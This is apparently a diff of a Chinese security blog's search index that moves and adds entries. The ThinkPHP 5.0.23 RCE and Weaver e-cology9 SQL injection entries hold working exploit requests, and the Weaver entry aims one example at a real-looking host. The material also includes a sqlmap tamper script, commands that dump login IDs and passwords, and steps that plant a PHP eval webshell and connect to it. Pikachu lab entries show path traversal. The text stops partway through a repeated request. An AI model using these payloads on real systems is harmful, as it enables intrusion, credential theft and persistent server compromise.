@@ -375,42 +375,6 @@
       </categories>
   </entry>
   <entry>
-    <title>泛微e-cology9 browser.jsp SQL注入</title>
-    <url>/2023/05/05/POC/%E6%B3%9B%E5%BE%AEe-cology9%20browser.jsp%20SQL%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="验证poc"><a href="#验证poc" class="headerlink" title="验证poc"></a>验证poc</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537</span><br></pre></td></tr></table></figure>
-
-<p>或者</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/mobile/plugin/browser.js</span><br></pre></td></tr></table></figure>
-
-<p>sql语句经过了三层全字符的url编码</p>
-<p><img src="/images/image-20230505210145029.png" alt="image-20230505210145029"></p>
-<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: oa.chinataitan.com:8081</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230424112323042.png" alt="image-20230424112323042"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,&#x27;&#x27;+(SELECT @@VERSION)+&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230424112525537.png" alt="image-20230424112525537"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,2222222222&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230424135948099.png" alt="image-20230424135948099"></p>
-<p><img src="/images/image-20230424140010831.png" alt="image-20230424140010831"></p>
-<h2 id="sqlmap-tamper"><a href="#sqlmap-tamper" class="headerlink" title="sqlmap tamper"></a>sqlmap tamper</h2><h3 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python </span><br><span class="line">import re</span><br><span class="line">from lib.core.settings import UNICODE_ENCODING</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"> </span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    # URL encoding for all characters</span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = encoded_payload.replace(&#x27; &#x27;, &#x27;%20&#x27;)</span><br><span class="line"></span><br><span class="line">    return encoded_payload</span><br></pre></td></tr></table></figure>
-
-<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver.py --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 --tables --batch</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver9.py -p &quot;keyword&quot; --level=5 --risk=2 --tables</span><br></pre></td></tr></table></figure>
-
-<h3 id="获取ecology的用户名密码"><a href="#获取ecology的用户名密码" class="headerlink" title="获取ecology的用户名密码"></a>获取ecology的用户名密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt  --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager --columns</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager -C id,password,loginid --dump</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230424145319892.png" alt="image-20230424145319892"></p>
-]]></content>
-      <categories>
-        <category>POC</category>
-      </categories>
-  </entry>
-  <entry>
     <title>pikachu靶场系列-CSRF</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/CSRF/</url>
     <content><![CDATA[<h1 id="CSRF概述"><a href="#CSRF概述" class="headerlink" title="CSRF概述"></a>CSRF概述</h1><p>CSRF(Cross-Site Request Forgery)跨站请求伪造</p>
@@ -1754,6 +1718,24 @@
       </categories>
   </entry>
   <entry>
+    <title>pikachu靶场系列-不安全的文件下载</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
+    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>当存在文件下载功能时，如果没有做好限制，则可能会造成任意文件下载，源码泄露等严重后果</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>抓取下载功能的数据包</p>
+<p><img src="/images/image-20230110105403955.png" alt="image-20230110105403955"></p>
+<p>文件下载的url为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=mbl.png</span><br></pre></td></tr></table></figure>
+
+<p>如果未做好限制，则会造成任意文件下载</p>
+<h5 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../index.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230110105601275.png" alt="image-20230110105601275"></p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pikachu靶场系列-不安全的URL跳转</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC/</url>
     <content><![CDATA[<p>如果后端采用了前端传进来的参数作为跳转的目的地，又没有做判断就可能跳转到钓鱼网站等恶意链接。</p>
@@ -1770,24 +1752,6 @@
 <p>可以抓个包看看</p>
 <p><img src="/images/image-20230110155246615.png" alt="image-20230110155246615"></p>
 <p>可以看到302响应包中的location字段指向百度</p>
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>pikachu靶场系列-不安全的文件下载</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
-    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>当存在文件下载功能时，如果没有做好限制，则可能会造成任意文件下载，源码泄露等严重后果</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>抓取下载功能的数据包</p>
-<p><img src="/images/image-20230110105403955.png" alt="image-20230110105403955"></p>
-<p>文件下载的url为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=mbl.png</span><br></pre></td></tr></table></figure>
-
-<p>如果未做好限制，则会造成任意文件下载</p>
-<h5 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../index.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230110105601275.png" alt="image-20230110105601275"></p>
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
@@ -2087,6 +2051,35 @@
       </categories>
   </entry>
   <entry>
+    <title>pikachu靶场系列-环境部署</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
+    <content><![CDATA[<p>linux上可使用宝塔进行部署</p>
+<p>windows上使用phpstudy搭建</p>
+<p>下述以windows为例</p>
+<h3 id="pikachu下载链接"><a href="#pikachu下载链接" class="headerlink" title="pikachu下载链接"></a>pikachu下载链接</h3><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>
+<h3 id="phpstudy下载链接"><a href="#phpstudy下载链接" class="headerlink" title="phpstudy下载链接"></a>phpstudy下载链接</h3><p><a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></p>
+<h3 id="开始部署"><a href="#开始部署" class="headerlink" title="开始部署"></a>开始部署</h3><h5 id="php"><a href="#php" class="headerlink" title="php"></a>php</h5><p>需要使用php 5.6版本，别搞太高了问题都不大</p>
+<p><img src="/images/1663473977746-571a7526-a3d8-4c08-a482-ff660a526735.png" alt="img"></p>
+<p>在这里面修改自己的php版本</p>
+<p><img src="/images/1663474059051-8bc29887-7653-43e6-b42c-f8cf6b1f88a7.png" alt="img"></p>
+<h5 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h5><p>数据库使用5.0版本</p>
+<p><img src="/images/1663474111537-28b43306-3ff8-4e40-95ab-b86aea6f87fe.png" alt="img"></p>
+<p><img src="/images/1660097657076-ec17be27-2b11-4054-a851-654fc2321f1a.png" alt="img"></p>
+<h3 id="启动后新建数据库"><a href="#启动后新建数据库" class="headerlink" title="启动后新建数据库"></a>启动后新建数据库</h3><p>这里主要是配置pikachu的数据库环境</p>
+<p><img src="/images/1663474183436-05a3186d-521e-4105-87f2-b00960ef11f5.png" alt="img"></p>
+<h3 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h3><p>解压后可以自己重命名(之后访问的路径)，放到phpstudy的根目录下</p>
+<p><img src="/images/1663475005203-02c5c0e7-5a86-4f12-a483-d98edaf3f6d4.png" alt="img"></p>
+<p>找到此配置文件\pikachu\inc\config.inc.php</p>
+<p>修改数据库相关信息，即上述在phpstudy中新建的pikachu数据库</p>
+<p><img src="/images/1660097734927-34555e1f-0b21-46b1-a457-0f6ce355a83a.png" alt="img"></p>
+<p><a href="http://127.0.0.1/DX/pikachu/install.php#">http://127.0.0.1/pikachu(自己命名的路径)/install.php</a></p>
+<p><img src="/images/1660097763217-bca63c0b-9f98-4260-9dda-9819b9c8b394.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pikachu靶场系列-暴力破解</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
     <content><![CDATA[<h1 id="暴力破解概述"><a href="#暴力破解概述" class="headerlink" title="暴力破解概述"></a>暴力破解概述</h1><p>当登录口未设置强安全机制，并且使用弱用户名弱口令，便存在被爆破成功风险。</p>
@@ -2189,35 +2182,6 @@
       </categories>
   </entry>
   <entry>
-    <title>pikachu靶场系列-环境部署</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
-    <content><![CDATA[<p>linux上可使用宝塔进行部署</p>
-<p>windows上使用phpstudy搭建</p>
-<p>下述以windows为例</p>
-<h3 id="pikachu下载链接"><a href="#pikachu下载链接" class="headerlink" title="pikachu下载链接"></a>pikachu下载链接</h3><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>
-<h3 id="phpstudy下载链接"><a href="#phpstudy下载链接" class="headerlink" title="phpstudy下载链接"></a>phpstudy下载链接</h3><p><a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></p>
-<h3 id="开始部署"><a href="#开始部署" class="headerlink" title="开始部署"></a>开始部署</h3><h5 id="php"><a href="#php" class="headerlink" title="php"></a>php</h5><p>需要使用php 5.6版本，别搞太高了问题都不大</p>
-<p><img src="/images/1663473977746-571a7526-a3d8-4c08-a482-ff660a526735.png" alt="img"></p>
-<p>在这里面修改自己的php版本</p>
-<p><img src="/images/1663474059051-8bc29887-7653-43e6-b42c-f8cf6b1f88a7.png" alt="img"></p>
-<h5 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h5><p>数据库使用5.0版本</p>
-<p><img src="/images/1663474111537-28b43306-3ff8-4e40-95ab-b86aea6f87fe.png" alt="img"></p>
-<p><img src="/images/1660097657076-ec17be27-2b11-4054-a851-654fc2321f1a.png" alt="img"></p>
-<h3 id="启动后新建数据库"><a href="#启动后新建数据库" class="headerlink" title="启动后新建数据库"></a>启动后新建数据库</h3><p>这里主要是配置pikachu的数据库环境</p>
-<p><img src="/images/1663474183436-05a3186d-521e-4105-87f2-b00960ef11f5.png" alt="img"></p>
-<h3 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h3><p>解压后可以自己重命名(之后访问的路径)，放到phpstudy的根目录下</p>
-<p><img src="/images/1663475005203-02c5c0e7-5a86-4f12-a483-d98edaf3f6d4.png" alt="img"></p>
-<p>找到此配置文件\pikachu\inc\config.inc.php</p>
-<p>修改数据库相关信息，即上述在phpstudy中新建的pikachu数据库</p>
-<p><img src="/images/1660097734927-34555e1f-0b21-46b1-a457-0f6ce355a83a.png" alt="img"></p>
-<p><a href="http://127.0.0.1/DX/pikachu/install.php#">http://127.0.0.1/pikachu(自己命名的路径)/install.php</a></p>
-<p><img src="/images/1660097763217-bca63c0b-9f98-4260-9dda-9819b9c8b394.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
     <title>pikachu靶场系列-目录遍历</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
     <content><![CDATA[<p>目录遍历，这里更像是路径穿越</p>
@@ -2296,6 +2260,87 @@
       </categories>
   </entry>
   <entry>
+    <title>thinkphp 5.0.23-RCE利用</title>
+    <url>/2023/05/18/POC/thinkphp%205.0.23-RCE%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a>基础payload</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 1.1.1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Wed, 27 Feb 2019 06:32:09 GMT</span><br><span class="line">If-None-Match: &quot;5c762ee9-5&quot;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 76</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518090910918.png" alt="image-20230518090910918"></p>
+<h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 1.1.1.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 135</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=/tmp/sess_5tc1epe1vuk0uqdfssbvvc3pe7&amp;x=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230517225116294.png" alt="image-20230517225116294"></p>
+<h2 id="构造数据包直接连接webshell"><a href="#构造数据包直接连接webshell" class="headerlink" title="构造数据包直接连接webshell"></a>构造数据包直接连接webshell</h2><p>利用方式和包含日志文件sess_xxxxxxxx类似，需要先将马先写入sess_xxxxxxxx日志文件中</p>
+<p>而这个sess_文件的名称是通过Cookie: PHPSESSID&#x3D;xxxxxxx来指定的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=good123123</span><br></pre></td></tr></table></figure>
+
+<p>则日志文件名为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sess_good123123</span><br></pre></td></tr></table></figure>
+
+<p>linux中通常放置于</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/sess_good123123</span><br></pre></td></tr></table></figure>
+
+<h3 id="创建session文件"><a href="#创建session文件" class="headerlink" title="创建session文件"></a>创建session文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=think\Session::set&amp;method=GET&amp;server[REQUEST_METHOD]=&lt;?php eval($_POST[&#x27;abc&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/sess_2333shell</span><br></pre></td></tr></table></figure>
+
+<h5 id="post包"><a href="#post包" class="headerlink" title="post包"></a>post包</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 1.1.1.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Cookie: PHPSESSID=good123123</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 110</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=think\Session::set&amp;method=GET&amp;server[REQUEST_METHOD]=&lt;?php eval($_POST[&#x27;abc&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518001530147.png" alt="image-20230518001530147"></p>
+<h5 id="可以查看一下tmp目录"><a href="#可以查看一下tmp目录" class="headerlink" title="可以查看一下tmp目录"></a>可以查看一下tmp目录</h5><p>看一下是否成功写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 1.1.1.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 77</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls /tmp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518001551800.png" alt="image-20230518001551800"></p>
+<h3 id="连接蚁剑"><a href="#连接蚁剑" class="headerlink" title="连接蚁剑"></a>连接蚁剑</h3><p><img src="/images/image-20230518001621137.png" alt="image-20230518001621137"></p>
+<h5 id="设置body"><a href="#设置body" class="headerlink" title="设置body"></a>设置body</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/sess_good123123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230518001404974.png" alt="image-20230518001404974"></p>
+<h5 id="成功连接"><a href="#成功连接" class="headerlink" title="成功连接"></a>成功连接</h5><p><img src="/images/image-20230518001431455.png" alt="image-20230518001431455"></p>
+<h5 id="看一下sess-xxxxxxxxx文件中的内容"><a href="#看一下sess-xxxxxxxxx文件中的内容" class="headerlink" title="看一下sess_xxxxxxxxx文件中的内容"></a>看一下sess_xxxxxxxxx文件中的内容</h5><p><img src="/images/image-20230518092101501.png" alt="image-20230518092101501"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">think|a:2:&#123;s:28:&quot;&lt;?php eval($_POST[&#x27;abc&#x27;]);?&gt;&quot;;s:0:&quot;&quot;;s:0:&quot;&quot;;s:0:&quot;&quot;;&#125;d2d977c58444271d9c780187e93f80e5|a:2:&#123;s:11:&quot;verify_code&quot;;s:32:&quot;5e3e4963c40c376ff421127ae4342bab&quot;;s:11:&quot;verify_time&quot;;i:1684371746;&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>POC</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>泛微e-cology9 browser.jsp SQL注入</title>
+    <url>/2023/05/05/POC/%E6%B3%9B%E5%BE%AEe-cology9%20browser.jsp%20SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="验证poc"><a href="#验证poc" class="headerlink" title="验证poc"></a>验证poc</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/mobile/plugin/browser.js</span><br></pre></td></tr></table></figure>
+
+<p>sql语句经过了三层全字符的url编码</p>
+<p><img src="/images/image-20230505210145029.png" alt="image-20230505210145029"></p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: oa.chinataitan.com:8081</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span 